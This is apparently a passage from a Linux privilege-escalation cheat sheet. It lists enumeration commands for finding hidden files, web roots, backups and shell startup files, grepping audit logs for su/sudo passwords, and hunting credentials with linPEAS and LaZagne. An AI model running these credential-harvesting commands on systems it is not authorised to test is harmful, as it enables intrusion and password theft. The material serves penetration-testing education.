Hidden files

    find / -type f -iname ".*" -ls 2>/dev/null

Script/Binaries in PATH

    for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
    for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done

Web files

    ls -alhR /var/www/ 2>/dev/null
    ls -alhR /srv/www/htdocs/ 2>/dev/null
    ls -alhR /usr/local/www/apache22/data/
    ls -alhR /opt/lampp/htdocs/ 2>/dev/null

Backups

    find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null

Known files containing passwords

Read the code of linPEAS, it searches for several possible files that
could contain passwords.
Another interesting tool that you can use to do so is: LaZagne which is
an open source application used to retrieve lots of passwords stored on
a local computer for Windows, Linux & Mac.

Logs

If you can read logs, you may be able to find interesting/confidential
information inside them. The more strange the log is, the more
interesting it will be (probably).
Also, some “bad” configured (backdoored?) audit logs may allow you to
record passwords inside audit logs as explained in this post:
https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/.

    aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
    grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null

In order to read logs the group adm will be really helpful.

Shell files

    ~/.bash_profile # if it exists, read it once when you log in to the shell
    ~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
    ~/.profile # if it exists, read once if the two above don't exist
    /etc/profile # only read if none of the above exists
    ~/.bashrc # if it exists, read it every time you start a new shell
    ~/.bash_logout # if it exists, read when the login shell exits
    ~/.zlogin #zsh shell
    ~/.zshrc #zsh shell

Generic Creds Search/Regex

You should also check for files containing the word “password” in its
name or inside the content, and also check for IPs and emails inside
logs, or hashes regexps.
I’m not going to list here how to do all of this but if you are
interested you can check the last checks that linpeas perform.
